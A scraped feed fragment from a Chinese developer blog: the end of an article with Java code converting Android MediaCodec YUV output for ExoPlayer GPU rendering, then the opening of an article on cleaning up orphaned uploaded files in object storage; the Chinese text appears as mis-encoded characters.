    finalBufferHolder.put(decodeOutputBuffer);
    finalBufferHolder.position(<span class="hljs-number">0</span>);

    <span class="hljs-type">VideoDecoderOutputBufferWrapper</span> <span class="hljs-variable">decoderOutputBuffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VideoDecoderOutputBufferWrapper</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DecoderOutputBuffer</span>.Owner&lt;VideoDecoderOutputBuffer&gt;() {
      <span class="hljs-meta">@Override</span>
      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseOutputBuffer</span><span class="hljs-params">(VideoDecoderOutputBuffer outputBuffer)</span> {
        <span class="hljs-keyword">if</span>(outputBuffer <span class="hljs-keyword">instanceof</span> VideoDecoderOutputBufferWrapper){
          byteBufferPool.recycle(((VideoDecoderOutputBufferWrapper) outputBuffer).bufferHolder);
        }
      }
    });
    decoderOutputBuffer.init(presentationTimeUs,C.VIDEO_OUTPUT_MODE_YUV,<span class="hljs-literal">null</span>);
    decoderOutputBuffer.bufferHolder = finalBufferHolder;
    decoderOutputBuffer.data = finalBufferHolder.getBuffer();
    decoderOutputBuffer.decoderPrivate = colorFormat;
    decoderOutputBuffer.width = alignWidth;
    decoderOutputBuffer.height = alignHeight;
    decoderOutputBuffer.colorspace = MediaCodecColorSpaceExtractor.extractColorStandard(outputFormat);
    decoderOutputBuffer.yuvStrides = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]{stride,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>};

    <span class="hljs-type">VideoDecoderOutputBufferRenderer</span> <span class="hljs-variable">bufferRenderer</span> <span class="hljs-operator">=</span> videoDecoderOutputBufferRenderer;
    <span class="hljs-keyword">if</span>(bufferRenderer != <span class="hljs-literal">null</span>){
      bufferRenderer.setOutputBuffer(decoderOutputBuffer);
    }
  }
}
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">yuvI420ToGpu</span><span class="hljs-params">(MediaCodecAdapter codec, ByteBuffer decodeOutputBuffer, <span class="hljs-type">long</span> presentationTimeUs)</span> {
  <span class="hljs-keyword">if</span>(decodeOutputBuffer != <span class="hljs-literal">null</span>){
    <span class="hljs-type">MediaFormat</span> <span class="hljs-variable">outputFormat</span> <span class="hljs-operator">=</span> codec.getOutputFormat();
    <span class="hljs-type">int</span> <span class="hljs-variable">colorFormat</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_COLOR_FORMAT);
    <span class="hljs-type">int</span> <span class="hljs-variable">width</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_WIDTH);
    <span class="hljs-type">int</span> <span class="hljs-variable">height</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_HEIGHT);

    <span class="hljs-type">int</span> <span class="hljs-variable">alignWidth</span> <span class="hljs-operator">=</span> width;
    <span class="hljs-type">int</span> <span class="hljs-variable">alignHeight</span> <span class="hljs-operator">=</span> height;

    <span class="hljs-type">int</span> <span class="hljs-variable">stride</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_STRIDE);
    <span class="hljs-type">int</span> <span class="hljs-variable">sliceHeight</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_SLICE_HEIGHT);
    <span class="hljs-keyword">if</span> (stride &gt; <span class="hljs-number">0</span> &amp;&amp; sliceHeight &gt; <span class="hljs-number">0</span>) {
      alignWidth = stride;
      alignHeight = sliceHeight;
    }

  <span class="hljs-comment">//  alignWidth = alignTo16(alignWidth); å¯¹é½é€»è¾‘å­˜åœ¨é£é™©</span>
   <span class="hljs-comment">// alignHeight = alignTo16(alignHeight); å¯¹é½é€»è¾‘å­˜åœ¨é£é™©</span>

    <span class="hljs-type">int</span> <span class="hljs-variable">decodeOutputBufferSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-type">ByteBufferHolder</span> <span class="hljs-variable">finalBufferHolder</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">switch</span> (colorFormat){
      <span class="hljs-keyword">case</span> CodecCapabilities.COLOR_FormatYUV420Flexible:
      <span class="hljs-keyword">case</span> CodecCapabilities.COLOR_FormatYUV420Planar:
      <span class="hljs-keyword">case</span> CodecCapabilities.COLOR_FormatYUV420PackedPlanar:
        <span class="hljs-comment">//android è¿™é‡Œæ˜¯I420æ ¼å¼</span>
        decodeOutputBufferSize = decodeOutputBuffer.limit();
        finalBufferHolder = byteBufferPool.obtain(decodeOutputBufferSize);
        finalBufferHolder.put(decodeOutputBuffer);
        finalBufferHolder.position(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> CodecCapabilities.COLOR_FormatYUV420SemiPlanar: {
        decodeOutputBufferSize = alignWidth * alignHeight * <span class="hljs-number">3</span> / <span class="hljs-number">2</span>;
        <span class="hljs-type">ByteBufferHolder</span> <span class="hljs-variable">bufferHolder</span> <span class="hljs-operator">=</span> byteBufferPool.obtain(decodeOutputBufferSize);
        YuvTools.yuvNv12ToYuv420P(decodeOutputBuffer, bufferHolder.getBuffer(), alignWidth, alignHeight);
        bufferHolder.position(<span class="hljs-number">0</span>);
        finalBufferHolder = bufferHolder;
      }
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> CodecCapabilities.COLOR_FormatYUV420PackedSemiPlanar: {
        decodeOutputBufferSize = alignWidth * alignHeight * <span class="hljs-number">3</span> / <span class="hljs-number">2</span>;
        <span class="hljs-type">ByteBufferHolder</span> <span class="hljs-variable">bufferHolder</span> <span class="hljs-operator">=</span> byteBufferPool.obtain(decodeOutputBufferSize);
        YuvTools.yuvNv21ToYuv420P(decodeOutputBuffer, bufferHolder.getBuffer(), alignWidth, alignHeight);
        bufferHolder.position(<span class="hljs-number">0</span>);
        finalBufferHolder = bufferHolder;
      }
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"the Color-Format is not supported : "</span> + colorFormat);
    }
    <span class="hljs-type">VideoDecoderOutputBufferWrapper</span> <span class="hljs-variable">decoderOutputBuffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VideoDecoderOutputBufferWrapper</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DecoderOutputBuffer</span>.Owner&lt;VideoDecoderOutputBuffer&gt;() {
      <span class="hljs-meta">@Override</span>
      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseOutputBuffer</span><span class="hljs-params">(VideoDecoderOutputBuffer outputBuffer)</span> {
        <span class="hljs-keyword">if</span>(outputBuffer <span class="hljs-keyword">instanceof</span> VideoDecoderOutputBufferWrapper){
          byteBufferPool.recycle(((VideoDecoderOutputBufferWrapper) outputBuffer).bufferHolder);
        }
      }
    });
    decoderOutputBuffer.init(presentationTimeUs,C.VIDEO_OUTPUT_MODE_YUV,<span class="hljs-literal">null</span>);
    <span class="hljs-type">boolean</span> <span class="hljs-variable">isDebug</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;


    decoderOutputBuffer.init(presentationTimeUs,C.VIDEO_OUTPUT_MODE_YUV,<span class="hljs-literal">null</span>);
    decoderOutputBuffer.bufferHolder = finalBufferHolder;
    decoderOutputBuffer.data = finalBufferHolder.getBuffer();
    decoderOutputBuffer.decoderPrivate = CodecCapabilities.COLOR_FormatYUV420Planar;
    decoderOutputBuffer.width = alignWidth;
    decoderOutputBuffer.height = alignHeight;
    decoderOutputBuffer.colorspace = MediaCodecColorSpaceExtractor.extractColorStandard(outputFormat);
    decoderOutputBuffer.yuvStrides = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]{stride,stride/<span class="hljs-number">2</span>,stride/<span class="hljs-number">2</span>};

    <span class="hljs-keyword">if</span> (isDebug) {
      finalBufferHolder.position(<span class="hljs-number">0</span>);
      <span class="hljs-type">int</span> <span class="hljs-variable">limit</span> <span class="hljs-operator">=</span> finalBufferHolder.limit();
      <span class="hljs-type">Buffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> bufferPool.obtain(limit);
      finalBufferHolder.get(buffer.getBuffer(), <span class="hljs-number">0</span>, limit);
      buffer.setEffectiveSize(limit);
      <span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> YuvTools.toBitmap(buffer.getBuffer(), width, height);
      Log.d(TAG, <span class="hljs-string">"Bitmap = "</span> + bitmap);
      buffer.recycle();
      finalBufferHolder.position(<span class="hljs-number">0</span>);
    }

  <span class="hljs-comment">//  yuvDataBuffer.recycle();</span>
    <span class="hljs-type">VideoDecoderOutputBufferRenderer</span> <span class="hljs-variable">bufferRenderer</span> <span class="hljs-operator">=</span> videoDecoderOutputBufferRenderer;
    <span class="hljs-keyword">if</span>(bufferRenderer != <span class="hljs-literal">null</span>){
      bufferRenderer.setOutputBuffer(decoderOutputBuffer);
    }
    decodeOutputBuffer = <span class="hljs-literal">null</span>;
  }
}
</code></pre>
<p>ä»¥ä¸Šä¸»è¦æ˜¯é€‚é…ExoPlayerä»£ç ï¼Œé€šè¿‡ä¸Šé¢çš„é€»è¾‘ï¼Œæˆ‘ä»¬å®Œæ•´å®ç°äº†MediaCodec-&gt;Buffer(I420ã€NV21ã€NV12ã€YUV422)-&gt;GPUçš„æ ¸å¿ƒæµç¨‹ã€‚</p>
<h2 data-id="heading-8">è‰²å½©ç©ºé—´æå–</h2>
<p>å…¶å®ï¼Œè¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°MediaCodecColorSpaceExtractorï¼Œè¿™ä¸ªè´Ÿè´£æå–è‰²å½©ç©ºé—´</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-comment">// å‡è®¾è¿™æ˜¯ä¸€ä¸ªè§£ç å¾ªç¯ä¸­çš„è¾…åŠ©ç±»</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MediaCodecColorSpaceExtractor</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">"ColorSpaceExtractor"</span>;

    <span class="hljs-comment">/**
     * åœ¨ MediaCodec å¤„äºè§£ç çŠ¶æ€æ—¶ï¼Œä»è¾“å‡ºæ ¼å¼ä¸­æå–é¢œè‰²ç©ºé—´ä¿¡æ¯ã€‚
     *
     * <span class="hljs-doctag">@param</span> outputFormat å·²å¯åŠ¨çš„ MediaFormat å®ä¾‹
     * <span class="hljs-doctag">@return</span> é¢œè‰²æ ‡å‡†å¸¸é‡ (ä¾‹å¦‚ MediaFormat.COLOR_STANDARD_BT709)ï¼Œå¦‚æœä¸æ”¯æŒæˆ–æœªæ‰¾åˆ°ï¼Œåˆ™è¿”å› -1
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">extractColorStandard</span><span class="hljs-params">(MediaFormat outputFormat)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (outputFormat == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
            }
            <span class="hljs-keyword">if</span> (outputFormat.containsKey(MediaFormat.KEY_COLOR_STANDARD)) {
                <span class="hljs-type">int</span> <span class="hljs-variable">colorStandard</span> <span class="hljs-operator">=</span> outputFormat.getInteger(MediaFormat.KEY_COLOR_STANDARD);
                <span class="hljs-keyword">return</span> getColorSpaceStandard(colorStandard);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
            }
        } <span class="hljs-keyword">catch</span> (IllegalStateException e) {
            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
        }
    }


    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getColorSpaceStandard</span><span class="hljs-params">(<span class="hljs-type">int</span> standard)</span> {
        <span class="hljs-keyword">switch</span> (standard) {
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_STANDARD_BT709:
             <span class="hljs-comment">//   VideoLogUtil.d(TAG, "BT.709 (HD/Standard)");</span>
                <span class="hljs-keyword">return</span> VideoDecoderOutputBuffer.COLORSPACE_BT709;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_STANDARD_BT601_NTSC:
             <span class="hljs-comment">//   VideoLogUtil.d(TAG, "BT.601 NTSC (SD)");</span>
                <span class="hljs-keyword">return</span> VideoDecoderOutputBuffer.COLORSPACE_BT601;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_STANDARD_BT601_PAL:
               <span class="hljs-comment">// VideoLogUtil.d(TAG, "BT.601 PAL (SD)");</span>
                <span class="hljs-keyword">return</span> VideoDecoderOutputBuffer.COLORSPACE_BT601;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_STANDARD_BT2020:
              <span class="hljs-comment">//  VideoLogUtil.d(TAG, "BT.2020 (UHD/HDR)");</span>
                <span class="hljs-keyword">return</span> VideoDecoderOutputBuffer.COLORSPACE_BT2020;
            <span class="hljs-keyword">default</span>:
               <span class="hljs-comment">// VideoLogUtil.d(TAG, "Unknown/Default (" + standard + ")");</span>
                ;
        }
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    }


    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getColorRangeName</span><span class="hljs-params">(<span class="hljs-type">int</span> range)</span> {
        <span class="hljs-keyword">switch</span> (range) {
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_RANGE_FULL:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"Full (0-255)"</span>;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_RANGE_LIMITED:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"Limited (16-235)"</span>;
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"Unknown Range"</span>;
        }
    }

    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getColorTransferName</span><span class="hljs-params">(<span class="hljs-type">int</span> transfer)</span> {
        <span class="hljs-keyword">switch</span> (transfer) {
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_TRANSFER_SDR_VIDEO:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"SDR (Standard Dynamic Range)"</span>;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_TRANSFER_HLG:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"HLG (Hybrid Log-Gamma) - HDR"</span>;
            <span class="hljs-keyword">case</span> MediaFormat.COLOR_TRANSFER_ST2084:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"PQ (Perceptual Quantizer) - HDR"</span>;
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"Unknown Transfer"</span>;
        }
    }
}
</code></pre>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>ä»¥ä¸Šå°±æ˜¯å®Œæ•´ä»£ç ï¼Œæœ¬ç¯‡çš„ä¸»è¦å†…å®¹æ˜¯é€šè¿‡MediaCodecBufferæ¨¡å¼ï¼Œé¿å…CPUåˆ°GPUä¹‹å‰éœ€è¦CPUè½¬YUV I420é€ æˆçš„æ€§èƒ½é—®é¢˜ï¼Œä»¥åŠæ•°æ®é‡å˜å¤§çš„é—®é¢˜ã€‚</p>
<p>åé¢ï¼Œæˆ‘ä»¬ä¼šç»§ç»­åˆ†äº«æœ‰å…³æ¸²æŸ“ã€å½•åˆ¶å’Œå¤šå±æ¸²æŸ“ç›¸å…³çš„æ–‡ç« ã€‚</p>
<p>æœ¬ç¯‡å°±åˆ°è¿™é‡Œï¼Œå¸Œæœ›å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­¤å„¿èµ„æºæ²»ç†ï¼šå¦‚ä½•ä¼˜é›…å¤„ç†â€œä¸Šä¼ äº†ä½†æœªæäº¤â€çš„å†—ä½™æ–‡ä»¶ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592683699771113482</link>    <guid>https://juejin.cn/post/7592683699771113482</guid>    <pubDate>2026-01-08T03:45:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592683699771113482" data-draft-id="7592548677744558126" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å­¤å„¿èµ„æºæ²»ç†ï¼šå¦‚ä½•ä¼˜é›…å¤„ç†â€œä¸Šä¼ äº†ä½†æœªæäº¤â€çš„å†—ä½™æ–‡ä»¶ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯,Java,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-08T03:45:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ´›å°è±†"/> <meta itemprop="url" content="https://juejin.cn/user/2049145406229127"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å­¤å„¿èµ„æºæ²»ç†ï¼šå¦‚ä½•ä¼˜é›…å¤„ç†â€œä¸Šä¼ äº†ä½†æœªæäº¤â€çš„å†—ä½™æ–‡ä»¶ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2049145406229127/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ´›å°è±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:45:53.000Z" title="Thu Jan 08 2026 03:45:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ€è¿‘åœ¨å¼€å‘åŠŸèƒ½çš„æ—¶å€™ï¼Œæ–°å¢äº†æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ã€‚ä½†æ˜¯å‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯OSSé‡Œå †ç§¯äº†å¤§é‡â€œæ— ä¸»â€çš„æ–‡ä»¶ï¼šç”¨æˆ·ä¸Šä¼ äº†å¤´åƒä½†æ²¡ä¿å­˜èµ„æ–™ã€ä¸Šä¼ äº†é™„ä»¶å´å…³é—­äº†é¡µé¢â€¦è¿™äº›â€œå­¤å„¿æ–‡ä»¶â€é™é™åœ°èººåœ¨å­˜å‚¨æ¡¶é‡Œï¼Œæ²¡äººå¼•ç”¨ï¼Œä¹Ÿæ²¡äººæ¸…ç†ã€‚</p>
</blockquote>
<h2 data-id="heading-0">1. èƒŒæ™¯ä¸ç—›ç‚¹</h2>
<p>åœ¨ Web ç³»ç»Ÿå¼€å‘ä¸­ï¼Œ<strong>â€œè¡¨å• + æ–‡ä»¶ä¸Šä¼ â€</strong> æ˜¯ä¸€ä¸ªæé«˜é¢‘çš„åœºæ™¯ã€‚</p>
<p>é€šå¸¸çš„å®ç°æµç¨‹æ˜¯ï¼š</p>
<ol>
<li>ç”¨æˆ·åœ¨è¡¨å•é¡µç‚¹å‡»ä¸Šä¼ ï¼Œå‰ç«¯è°ƒç”¨ä¸Šä¼ æ¥å£ã€‚</li>
<li>æœåŠ¡ç«¯æ¥æ”¶æ–‡ä»¶ï¼Œä¸Šä¼ è‡³ OSSï¼Œå¹¶è¿”å› URLã€‚</li>
<li>å‰ç«¯æ‹¿åˆ° URLï¼Œå¡«å…¥è¡¨å•çš„éšè—åŸŸã€‚</li>
<li>ç”¨æˆ·ç‚¹å‡»â€œæäº¤â€ï¼Œå°†è¡¨å•æ•°æ®ï¼ˆå« URLï¼‰å‘é€ç»™æœåŠ¡ç«¯ä¿å­˜ã€‚</li>
</ol>
<p><strong>æ ¸å¿ƒç—›ç‚¹ï¼š</strong>
å¦‚æœç”¨æˆ·åœ¨ç¬¬ 2 æ­¥ä¸Šä¼ æˆåŠŸåï¼Œå› ä¸ºç½‘ç»œä¸­æ–­ã€é¡µé¢å…³é—­æˆ–ä¸»è§‚æ”¾å¼ƒç­‰åŸå› ï¼Œ<strong>æ²¡æœ‰æ‰§è¡Œç¬¬ 4 æ­¥çš„æäº¤</strong>ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±å·²ç»å­˜åœ¨äº OSS ä¸­ï¼Œä½†æ²¡æœ‰ä»»ä½•ä¸šåŠ¡æ•°æ®å¼•ç”¨å®ƒã€‚</p>
